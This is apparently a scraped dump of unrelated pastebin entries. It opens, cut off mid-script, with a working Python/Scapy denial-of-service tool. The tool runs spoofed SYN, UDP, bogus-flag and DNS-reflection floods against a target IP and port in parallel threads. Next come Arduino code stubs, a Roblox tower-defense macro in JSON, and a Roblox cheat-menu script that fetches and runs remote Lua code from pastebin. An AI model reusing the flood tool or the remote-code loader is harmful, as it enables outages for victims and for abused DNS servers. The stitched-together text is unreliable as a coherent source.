            IP_Packet = IP ()
            IP_Packet.src = ""."".join(map(str, (random.randint(0,255)for _ in range(4))))
            IP_Packet.dst = sys.argv[1]

            TCP_Packet = TCP ()	
            TCP_Packet.sport = s_port
            TCP_Packet.dport = int(sys.argv[2])
            TCP_Packet.flags = ""SEC""
            TCP_Packet.seq = s_eq
            TCP_Packet.window = w_indow

            send(IP_Packet/TCP_Packet, verbose=0)
        except:
            pass
            
def _tsunami():
    while _abort == False:
        try:
            s_port = random.randint(1000,9000)
            s_eq = random.randint(1000,9000)
            w_indow = random.randint(1000,9000)

            IP_Packet = IP ()
            IP_Packet.src = ""."".join(map(str, (random.randint(0,255)for _ in range(4))))
            IP_Packet.dst = sys.argv[1]

            TCP_Packet = TCP ()	
            TCP_Packet.sport = s_port
            TCP_Packet.dport = int(sys.argv[2])
            TCP_Packet.flags = ""SA"" # SYN flag set
            TCP_Packet.seq = s_eq
            TCP_Packet.window = w_indow

            payload = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(1, int(sys.argv[3]))))
            send(IP_Packet/TCP_Packet/(bytes(payload.encode())), verbose=0)
        except:
            pass
            
def _dns():
    _tldn = ['.com', '.net', '.org', '.edu', '.gov', '.zone', '.de', '.es', '.mx', '.ca', 
             '.uk', '.co.uk', '.fed.us', '.ru', '.xyz', '.shop', '.biz', '.mil', '.army.mil'
             ]

    while _abort == False:
        try:
            # random DNS server to reflect packet
            _Server = random.choice(rslvrs)
            
            # random site to query
            _site = ""www."" + ''.join(random.choices(string.ascii_letters, k=random.randint(8, 15))) + random.choice(_tldn)
            
            # craft packet / send
            packet = IP(dst=_Server, src=sys.argv[1]) / UDP(sport=RandShort(), dport=53) / DNS(rd=1,opcode=0,qd=DNSQR(qname=_site,qclass=""IN"",qtype=""A""))
            send(packet, verbose=False)
        except KeyboardInterrupt:
            pass
            
def _sudp():
    while _abort == False:
        try:
            # generate fake ip
            fake_ip = ""."".join(str(random.randint(0, 255)) for _ in range(4))
            
            # select random src port
            src_port = int(RandShort())
            
            # generate data buffer
            payload = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(1, int(sys.argv[3]))))
            
            # craft and send packet
            packet = IP(src=fake_ip, dst=sys.argv[1]) / UDP(sport=src_port, dport=int(sys.argv[2])) / payload.encode()
            send(packet, verbose=False)
        except:
            pass
            
def _bogus():
    _flags = ['S','A','P','U','F','R','E','C']
    while _abort == False:
        try:
            # choose random flag/s to send
            flag = ''
            max = random.randint(1, len(_flags))
            while max != 0:
                new = random.choice(_flags)
                if not new in flag:
                    flag = flag + new
                    max -=1
                    
            s_port = random.randint(1000,9000)
            s_eq = random.randint(1000,9000)
            w_indow = random.randint(1000,9000)

            IP_Packet = IP ()
            IP_Packet.src = ""."".join(map(str, (random.randint(0,255)for _ in range(4))))
            IP_Packet.dst = sys.argv[1]

            TCP_Packet = TCP ()	
            TCP_Packet.sport = s_port
            TCP_Packet.dport = int(sys.argv[2])
            TCP_Packet.flags = flag
            TCP_Packet.seq = s_eq
            TCP_Packet.window = w_indow

            send(IP_Packet/TCP_Packet, verbose=0)
        except:
            pass

def main():
    global rslvrs, _abort
    if len(sys.argv) != 7:# 8:
        sys.exit(""\r\n   SYNTAX: <ip> <port> <size> <dnslist.txt> <time> <iface>\r\n"")# <opcode>\r\n"")

    if not 'SUDO_UID' in os.environ:
        sys.exit(""\r\n    Script requires root elevation!\r\n"")

    # append DNS list to array
    try:
        with open(sys.argv[4], ""r"") as f:
            for line in f:
                if ""\n"" in line:
                    # remove any carriage return/s
                    line = line.replace(""\n"", """")
                    rslvrs.append(line)
                else:
                    rslvrs.append(line)
    except KeyboardInterrupt:
        sys.exit(""\r\n User-abort during list importation!\r\n"")
    except: #FileNotFoundError:
        sys.exit(""\r\n Critical error encountered. List missing/unavailable?\r\n"")
        
    print(""""""\r\n\r\n\r\n\r\n\r\n\r\n
                                      ███
                                     ██▓▓██
                                      ██▓▓▓▓██
                                      ██▒▒░░▓▓██
                                      ██▒▒░░▓▓▓▓▓▓
                                    ██▓▓▒▒░░▒▒▓▓▓▓█
                                  ██▓▓▒▒░░  ░░▒▒▓▓██
                                ██▓▓▒▒░░    ░░▒▒▓▓██
                              ██▓▓▒▒░░      ░░▒▒▓▓██
                            ▓▓▓▓▒▒░░      ░░▒▒▓▓██░░
                          ██▓▓▒▒░░        ░░▒▒▓▓██  
                        ██▓▓▒▒░░        ░░▒▒▓▓██    ██
                      ██▓▓▒▒░░░░      ░░▒▒▓▓██      ████
                      ██▓▓▒▒░░      ░░▒▒▓▓██      ██▓▓██
                    ██▓▓▒▒░░      ░░▒▒▓▓██      ██▓▓▒▒▓▓██
                    ██▓▓▒▒░░    ░░▒▒▓▓██      ██▓▓▒▒  ▓▓██
                  ██▓▓▒▒░░      ░░▒▒▓▓██    ██▓▓▒▒░░▒▒▓▓██
                  ██▓▓▒▒░░    ░░▒▒▓▓██    ██▓▓▒▒░░▒▒▓▓██░░
                  ██▓▓▒▒░░░░  ░░▒▒▓▓██    ██▓▓▒▒░░▒▒▓▓██
                    ██▓▓▒▒░░░░▒▒▓▓██    ██▓▓▒▒  ▒▒▓▓██
                    ██▓▓▒▒░░░░▒▒▓▓██    ██▓▓▒▒  ▒▒▓▓██
                      ██▓▓▒▒░░▒▒▓▓██      ██▓▓▒▒▓▓██
                      ░░██▓▓▓▓▒▒▒▒▓▓██    ░░██▓▓██░░
                          ████▓▓▓▓▓▓▓▓██      ████
                              ████▓▓▓▓▓▓██      ██
                                  ██████▓▓██
"""""")
    print("" Is it getting hot in here? Frying "" + sys.argv[1] + "":"" + sys.argv[2] + "" for "" + sys.argv[5] + "" seconds...\r\n"")
    
    # run threads
    _vectors = [_icmp, _dominate, _tsunami, _dns, _sudp, _bogus]
    tasks = []
    for x in _vectors:
        x = threading.Thread(target=x)
        tasks.append(x)
        x.start()
    
    _quit = time.time() + int(sys.argv[5])
    try:
        while time.time() <= _quit:
            pass
    except KeyboardInterrupt:
        pass
        
    _abort = True
    
    for z in tasks:
        try:
            z.join()
        except KeyboardInterrupt:
            pass
    
    sys.exit(""\r\n Done!\r\n"")
    
if __name__ == ""__main__"":
    main()"
dCUW54Ge,"""Arduino_JSON"" rev_02",pleasedontcode,Arduino,Thursday 2nd of May 2024 10:35:16 PM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: ""Arduino_JSON""
	- Source Code NOT compiled for: ESP32 DevKit V1
	- Source Code created on: 2024-05-03 03:33:11

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* send json post esp8266 */
/****** END SYSTEM REQUIREMENTS *****/

/****** DEFINITION OF LIBRARIES *****/
#include <Arduino_JSON.h> // http://github.com/arduino-libraries/Arduino_JSON

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);

/***** DEFINITION OF DIGITAL INPUT PINS *****/
const uint8_t myButton_PushButton_PIN_D4 = 4;

/****** DEFINITION OF LIBRARIES CLASS INSTANCES*****/
JSONVar myObject;

void setup(void)
{
  // put your setup code here, to run once:
  pinMode(myButton_PushButton_PIN_D4, INPUT_PULLUP);

  // SYSTEM REQUIREMENT 1: send json post esp8266
  // Add your code here to send JSON POST request using ESP8266
}

void loop(void)
{
  // put your main code here, to run repeatedly:

}

/* END CODE */"
vT9ZiVXW,Button Monitor rev_01,pleasedontcode,Arduino,Thursday 2nd of May 2024 10:23:03 PM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: Button Monitor
	- Source Code NOT compiled for: ESP32 DevKit V1
	- Source Code created on: 2024-05-03 03:22:24

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* send json post esp8266 */
/****** END SYSTEM REQUIREMENTS *****/

/****** DEFINITION OF LIBRARIES *****/
#include <EasyButton.h>	//https://github.com/evert-arias/EasyButton

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);

/***** DEFINITION OF DIGITAL INPUT PINS *****/
const uint8_t reset_PushButton_PIN_D4 = 4;

/****** DEFINITION OF LIBRARIES CLASS INSTANCES*****/
EasyButton resetButton(reset_PushButton_PIN_D4); // Initialize EasyButton object for the reset button

void setup(void)
{
	// put your setup code here, to run once:
	pinMode(reset_PushButton_PIN_D4, INPUT_PULLUP);

	resetButton.begin(); // Initialize the EasyButton object
	resetButton.onPressed([]() {
		Serial.println(""Reset button pressed"");
	});

	/* send json post esp8266 */
}

void loop(void)
{
	// put your main code here, to run repeatedly:
	resetButton.read(); // Check the state of the reset button
}

/* END CODE */"
EkhmexhZ,expert Misleading Pond shotgun patrol edj warship armored gjug,DuyOnline101,Lua,Thursday 2nd of May 2024 10:18:58 PM CDT,"[{""difficulty"":""Expert"",""Type"":""DifficultyVoteCast""},{""Type"":""DifficultyVoteReady""},{""Type"":""PlaceTower"",""vector"":""-18.136594772338867, 15.508583068847656, 44.95659255981445"",""number4"":0,""unitName"":""Shotgunner"",""firstNumber"":275671.1486422},{""Type"":""PlaceTower"",""vector"":""-18.756792068481445, 15.508583068847656, 36.59851837158203"",""number4"":0,""unitName"":""Shotgunner"",""firstNumber"":275672.2182083},{""Type"":""PlaceTower"",""vector"":""17.461502075195312, 14.671871185302734, 50.36402130126953"",""number4"":0,""unitName"":""Patrol Boat"",""firstNumber"":275699.8442375},{""Type"":""TowerUpgradeRequest"",""firstNumber"":3,""secondNumber"":1},{""Type"":""TowerUpgradeRequest"",""firstNumber"":3,""secondNumber"":1},{""Type"":""TowerUpgradeRequest"",""firstNumber"":3,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":3,""secondNumber"":1},{""Type"":""TowerUpgradeRequest"",""firstNumber"":3,""secondNumber"":2},{""Type"":""PlaceTower"",""vector"":""26.650426864624023, 15.508583068847656, 80.25591278076172"",""number4"":0,""unitName"":""Armored Factory"",""firstNumber"":275786.0460429},{""Type"":""TowerUpgradeRequest"",""firstNumber"":4,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":4,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":4,""secondNumber"":2},{""Type"":""PlaceTower"",""vector"":""8.39156436920166, 15.508583068847656, 61.12021255493164"",""number4"":0,""unitName"":""Golden Juggernaut"",""firstNumber"":275863.1919996},{""Type"":""TowerUpgradeRequest"",""firstNumber"":5,""secondNumber"":1},{""Type"":""TowerUpgradeRequest"",""firstNumber"":5,""secondNumber"":1},{""Type"":""TowerUpgradeRequest"",""firstNumber"":5,""secondNumber"":1},{""Type"":""TowerUpgradeRequest"",""firstNumber"":5,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":5,""secondNumber"":2},{""Type"":""PlaceTower"",""vector"":""5.440317153930664, 16.072124481201172, 63.94898986816406"",""number4"":0,""unitName"":""EDJ"",""firstNumber"":275927.13424},{""Type"":""TowerUpgradeRequest"",""firstNumber"":6,""secondNumber"":1},{""Type"":""TowerUpgradeRequest"",""firstNumber"":6,""secondNumber"":1},{""Type"":""TowerUpgradeRequest"",""firstNumber"":6,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":6,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":6,""secondNumber"":2},{""Type"":""PlaceTower"",""vector"":""4.462224960327148, 15.508583068847656, 59.12398147583008"",""number4"":0,""unitName"":""Golden Juggernaut"",""firstNumber"":275951.29141229999},{""Type"":""TowerUpgradeRequest"",""firstNumber"":7,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":7,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":7,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":7,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":7,""secondNumber"":1},{""Type"":""TowerUpgradeRequest"",""firstNumber"":7,""secondNumber"":1},{""Type"":""PlaceTower"",""vector"":""0.06278389692306519, 15.508583068847656, 58.410823822021484"",""number4"":0,""unitName"":""Golden Juggernaut"",""firstNumber"":275985.1705118},{""Type"":""TowerUpgradeRequest"",""firstNumber"":8,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":8,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":8,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":8,""secondNumber"":1},{""Type"":""TowerUpgradeRequest"",""firstNumber"":8,""secondNumber"":1},{""Type"":""PlaceTower"",""vector"":""12.651220321655273, 16.065561294555664, 63.09747314453125"",""number4"":0,""unitName"":""Golden Juggernaut"",""firstNumber"":276003.08746889999},{""Type"":""TowerUpgradeRequest"",""firstNumber"":9,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":9,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":9,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":9,""secondNumber"":1},{""Type"":""TowerUpgradeRequest"",""firstNumber"":9,""secondNumber"":1},{""Type"":""PlaceTower"",""vector"":""388.55194091796875, -0.00000762939453125, 15.53643798828125"",""number4"":1,""unitName"":""Warship"",""firstNumber"":276014.8439659},{""Type"":""TowerUpgradeRequest"",""firstNumber"":10,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":10,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":10,""secondNumber"":1},{""Type"":""ChangeQueryType"",""firstNumber"":10,""secondNumber"":1},{""Type"":""ChangeQueryType"",""firstNumber"":10,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":10,""secondNumber"":1},{""Type"":""TowerUpgradeRequest"",""firstNumber"":10,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":10,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":6,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":6,""secondNumber"":2},{""Type"":""PlaceTower"",""vector"":""2.148925542831421, 16.072124481201172, 62.54938507080078"",""number4"":0,""unitName"":""EDJ"",""firstNumber"":276078.3074818},{""Type"":""TowerUpgradeRequest"",""firstNumber"":11,""secondNumber"":1},{""Type"":""TowerUpgradeRequest"",""firstNumber"":11,""secondNumber"":1},{""Type"":""TowerUpgradeRequest"",""firstNumber"":11,""secondNumber"":1},{""Type"":""TowerUpgradeRequest"",""firstNumber"":11,""secondNumber"":1},{""Type"":""TowerUpgradeRequest"",""firstNumber"":11,""secondNumber"":1},{""Type"":""TowerUpgradeRequest"",""firstNumber"":11,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":11,""secondNumber"":2},{""Type"":""PlaceTower"",""vector"":""-2.063098669052124, 16.072124481201172, 62.36065673828125"",""number4"":0,""unitName"":""Golden Juggernaut"",""firstNumber"":276084.2191107},{""Type"":""TowerUpgradeRequest"",""firstNumber"":12,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":12,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":12,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":12,""secondNumber"":1},{""Type"":""TowerUpgradeRequest"",""firstNumber"":12,""secondNumber"":1},{""Type"":""PlaceTower"",""vector"":""10.657320976257324, 15.891663551330566, 67.58364868164062"",""number4"":0,""unitName"":""Golden Juggernaut"",""firstNumber"":276089.9372408},{""Type"":""TowerUpgradeRequest"",""firstNumber"":13,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":13,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":13,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":13,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":13,""secondNumber"":1},{""Type"":""TowerUpgradeRequest"",""firstNumber"":13,""secondNumber"":1},{""Type"":""PlaceTower"",""vector"":""-0.5846550464630127, 16.072124481201172, 68.7509536743164"",""number4"":0,""unitName"":""Golden Juggernaut"",""firstNumber"":276105.1638142},{""Type"":""TowerUpgradeRequest"",""firstNumber"":1,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":1,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":1,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":1,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":1,""secondNumber"":1},{""Type"":""TowerUpgradeRequest"",""firstNumber"":1,""secondNumber"":1},{""Type"":""TowerUpgradeRequest"",""firstNumber"":12,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":8,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":7,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":9,""secondNumber"":2},{""Type"":""PlaceTower"",""vector"":""-4.468103408813477, 16.07212257385254, 66.23579406738281"",""number4"":0,""unitName"":""Golden Juggernaut"",""firstNumber"":276117.5097514},{""Type"":""TowerUpgradeRequest"",""firstNumber"":3,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":3,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":3,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":3,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":3,""secondNumber"":1},{""Type"":""TowerUpgradeRequest"",""firstNumber"":3,""secondNumber"":1},{""Type"":""PlaceTower"",""vector"":""17.44548225402832, 14.671875, 49.55586242675781"",""number4"":0,""unitName"":""Patrol Boat"",""firstNumber"":276125.3042731},{""Type"":""TowerUpgradeRequest"",""firstNumber"":2,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":2,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":2,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":2,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":2,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":2,""secondNumber"":1},{""Type"":""TowerUpgradeRequest"",""firstNumber"":2,""secondNumber"":1},{""Type"":""ChangeQueryType"",""firstNumber"":2,""secondNumber"":4},{""Type"":""PlaceTower"",""vector"":""20.352954864501953, 15.508583068847656, 73.03956604003906"",""number4"":0,""unitName"":""Shotgunner"",""firstNumber"":276130.3136233},{""firstNumber"":14,""Type"":""SellTower""},{""Type"":""PlaceTower"",""vector"":""5.203357696533203, 14.671875, 48.91128158569336"",""number4"":0,""unitName"":""Patrol Boat"",""firstNumber"":276132.8966562},{""Type"":""TowerUpgradeRequest"",""firstNumber"":14,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":14,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":14,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":14,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":14,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":14,""secondNumber"":1},{""Type"":""TowerUpgradeRequest"",""firstNumber"":14,""secondNumber"":1},{""Type"":""ChangeQueryType"",""firstNumber"":14,""secondNumber"":4},{""Type"":""PlaceTower"",""vector"":""17.612388610839844, 15.508583068847656, 74.8817367553711"",""number4"":0,""unitName"":""Shotgunner"",""firstNumber"":276137.9011663},{""firstNumber"":15,""Type"":""SellTower""},{""Type"":""PlaceTower"",""vector"":""17.46698760986328, 14.671875, 32.76380920410156"",""number4"":0,""unitName"":""Patrol Boat"",""firstNumber"":276142.8370999},{""Type"":""TowerUpgradeRequest"",""firstNumber"":15,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":15,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":15,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":15,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":15,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":15,""secondNumber"":1},{""Type"":""TowerUpgradeRequest"",""firstNumber"":15,""secondNumber"":1},{""Type"":""ChangeQueryType"",""firstNumber"":15,""secondNumber"":4},{""Type"":""PlaceTower"",""vector"":""6.465951919555664, 14.671875, 32.61266326904297"",""number4"":0,""unitName"":""Patrol Boat"",""firstNumber"":276151.0410344},{""Type"":""TowerUpgradeRequest"",""firstNumber"":16,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":16,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":16,""secondNumber"":2},{""Type"":""ChangeQueryType"",""firstNumber"":16,""secondNumber"":4},{""Type"":""TowerUpgradeRequest"",""firstNumber"":16,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":16,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":16,""secondNumber"":1},{""Type"":""TowerUpgradeRequest"",""firstNumber"":16,""secondNumber"":1},{""Type"":""PlaceTower"",""vector"":""16.95203399658203, 15.508583068847656, 73.41614532470703"",""number4"":0,""unitName"":""Shotgunner"",""firstNumber"":276170.3792553},{""firstNumber"":17,""Type"":""SellTower""},{""Type"":""PlaceTower"",""vector"":""33.93440246582031, 15.508583068847656, 79.8552474975586"",""number4"":0,""unitName"":""Armored Factory"",""firstNumber"":276173.7932098},{""Type"":""TowerUpgradeRequest"",""firstNumber"":17,""secondNumber"":1},{""Type"":""TowerUpgradeRequest"",""firstNumber"":17,""secondNumber"":1},{""Type"":""TowerUpgradeRequest"",""firstNumber"":17,""secondNumber"":1},{""Type"":""TowerUpgradeRequest"",""firstNumber"":17,""secondNumber"":1},{""Type"":""TowerUpgradeRequest"",""firstNumber"":17,""secondNumber"":1},{""Type"":""TowerUpgradeRequest"",""firstNumber"":17,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":17,""secondNumber"":2},{""Type"":""PlaceTower"",""vector"":""17.648475646972656, 15.508583068847656, 75.16932678222656"",""number4"":0,""unitName"":""Shotgunner"",""firstNumber"":276181.1236838},{""firstNumber"":18,""Type"":""SellTower""},{""Type"":""PlaceTower"",""vector"":""41.225730895996094, 15.508583068847656, 79.86717224121094"",""number4"":0,""unitName"":""Armored Factory"",""firstNumber"":276184.3545813},{""Type"":""TowerUpgradeRequest"",""firstNumber"":18,""secondNumber"":1},{""Type"":""TowerUpgradeRequest"",""firstNumber"":18,""secondNumber"":1},{""Type"":""TowerUpgradeRequest"",""firstNumber"":18,""secondNumber"":1},{""Type"":""TowerUpgradeRequest"",""firstNumber"":18,""secondNumber"":1},{""Type"":""TowerUpgradeRequest"",""firstNumber"":18,""secondNumber"":1},{""Type"":""TowerUpgradeRequest"",""firstNumber"":18,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":18,""secondNumber"":2},{""Type"":""PlaceTower"",""vector"":""19.2138671875, 15.508583068847656, 74.72972106933594"",""number4"":0,""unitName"":""Shotgunner"",""firstNumber"":276189.3287566},{""firstNumber"":19,""Type"":""SellTower""},{""Type"":""PlaceTower"",""vector"":""48.260677337646484, 15.508583068847656, 79.87146759033203"",""number4"":0,""unitName"":""Armored Factory"",""firstNumber"":276192.36024219999},{""Type"":""TowerUpgradeRequest"",""firstNumber"":19,""secondNumber"":1},{""Type"":""TowerUpgradeRequest"",""firstNumber"":19,""secondNumber"":1},{""Type"":""TowerUpgradeRequest"",""firstNumber"":19,""secondNumber"":1},{""Type"":""TowerUpgradeRequest"",""firstNumber"":19,""secondNumber"":1},{""Type"":""TowerUpgradeRequest"",""firstNumber"":19,""secondNumber"":1},{""Type"":""TowerUpgradeRequest"",""firstNumber"":19,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":19,""secondNumber"":2},{""Type"":""PlaceTower"",""vector"":""18.92645263671875, 15.508583068847656, 75.30268859863281"",""number4"":0,""unitName"":""Shotgunner"",""firstNumber"":276195.2669251},{""firstNumber"":20,""Type"":""SellTower""},{""Type"":""PlaceTower"",""vector"":""55.583370208740234, 15.508583068847656, 79.76579284667969"",""number4"":0,""unitName"":""Armored Factory"",""firstNumber"":276197.2913485},{""Type"":""TowerUpgradeRequest"",""firstNumber"":20,""secondNumber"":1},{""Type"":""TowerUpgradeRequest"",""firstNumber"":20,""secondNumber"":1},{""Type"":""TowerUpgradeRequest"",""firstNumber"":20,""secondNumber"":1},{""Type"":""TowerUpgradeRequest"",""firstNumber"":20,""secondNumber"":1},{""Type"":""TowerUpgradeRequest"",""firstNumber"":20,""secondNumber"":1},{""Type"":""TowerUpgradeRequest"",""firstNumber"":20,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":20,""secondNumber"":2},{""Type"":""PlaceTower"",""vector"":""18.86969566345215, 15.508583068847656, 74.64788818359375"",""number4"":0,""unitName"":""Shotgunner"",""firstNumber"":276200.29813229999},{""firstNumber"":21,""Type"":""SellTower""},{""Type"":""PlaceTower"",""vector"":""65.99689483642578, 15.508583068847656, 79.8553466796875"",""number4"":0,""unitName"":""Armored Factory"",""firstNumber"":276203.996558},{""Type"":""TowerUpgradeRequest"",""firstNumber"":21,""secondNumber"":1},{""Type"":""TowerUpgradeRequest"",""firstNumber"":21,""secondNumber"":1},{""Type"":""TowerUpgradeRequest"",""firstNumber"":21,""secondNumber"":1},{""Type"":""TowerUpgradeRequest"",""firstNumber"":21,""secondNumber"":1},{""Type"":""TowerUpgradeRequest"",""firstNumber"":21,""secondNumber"":1},{""Type"":""TowerUpgradeRequest"",""firstNumber"":21,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":21,""secondNumber"":2},{""Type"":""PlaceTower"",""vector"":""18.825035095214844, 15.508583068847656, 75.70318603515625"",""number4"":0,""unitName"":""Shotgunner"",""firstNumber"":276206.9163023},{""firstNumber"":22,""Type"":""SellTower""},{""firstNumber"":4,""Type"":""SellTower""},{""Type"":""PlaceTower"",""vector"":""26.23253631591797, 15.508583068847656, 79.978515625"",""number4"":0,""unitName"":""Armored Factory"",""firstNumber"":276212.0683701},{""Type"":""TowerUpgradeRequest"",""firstNumber"":4,""secondNumber"":1},{""Type"":""TowerUpgradeRequest"",""firstNumber"":4,""secondNumber"":1},{""Type"":""TowerUpgradeRequest"",""firstNumber"":4,""secondNumber"":1},{""Type"":""TowerUpgradeRequest"",""firstNumber"":4,""secondNumber"":1},{""Type"":""TowerUpgradeRequest"",""firstNumber"":4,""secondNumber"":1},{""Type"":""TowerUpgradeRequest"",""firstNumber"":4,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":4,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":5,""secondNumber"":1},{""Type"":""TowerUpgradeRequest"",""firstNumber"":5,""secondNumber"":1},{""Type"":""TowerUpgradeRequest"",""firstNumber"":7,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":7,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":8,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":9,""secondNumber"":2},{""Type"":""TowerUpgradeRequest"",""firstNumber"":13,""secondNumber"":2}]"
8FyH1Waf,DH REMI,hacimiks,Lua,Thursday 2nd of May 2024 10:12:54 PM CDT,"--First define the library
local Library = loadstring(game:HttpGet(""https://pastebin.com/raw/edJT9EGX"", true))()
--To close/open the UI (after it's been initialized) use Library:Close() to toggle it, use the keybind option to quickly make a toggle for it without hassle (there is an example below)

--Making a window
local Window = Library:CreateWindow""RemiAPE""
--There is a special property for windows which can be set to false (Window.canInit = false), if done so the window will not be initialized when Library:Init() is called

--Making a folder
Window:AddFolder""Folder""
--Folders can be used exactly like windows, they can hold all the options, you can even put folders inside of folders inside of folders.. and so on

--[[
    Adding otpions
    All options will by default have their flag names set to whatever the text is, unless the flag is set
]]

--Button
Window:AddButton({text = ""Hitbox Expander"", flag = ""button"", callback = function() print""pressed"" end})
--The flag for this option will be set to true after the button has been clicked, not sure how many uses there are for this
 
--Toggle
Window:AddToggle({text = ""Toggle"", flag = ""toggle"", state = false, callback = function(a) print(a) end})
Window:AddToggle({text = ""Toggle"", flag = ""toggle1"", state = true, callback = function(a) print(a) end})
--If the state is set to true by default then it will fire the callback when the library is initialized
 
--List
Window:AddList({text = ""List"", flag = ""list"", value = ""Value"", values = {""Value1"", ""Value2"", ""Value3"", ""Value4""}, callback = function(a) print(a) end})
--If the set value is not in the values table then it will get added to it
 
--Textbox
Window:AddBox({text = ""Box"", flag = ""box"", value = ""Value"", callback = function(a) print(a) end})
 
--Slider
Window:AddSlider({text = ""Slider"", flag = ""slider"", value = 100, min = 20, max = 200, float = 0.3, callback = function(a) print(a) end})
Window:AddSlider({text = ""Slider"", flag = ""slider1"", value = 0, min = -50, max = 100, callback = function(a) print(a) end})
 
--Keybind
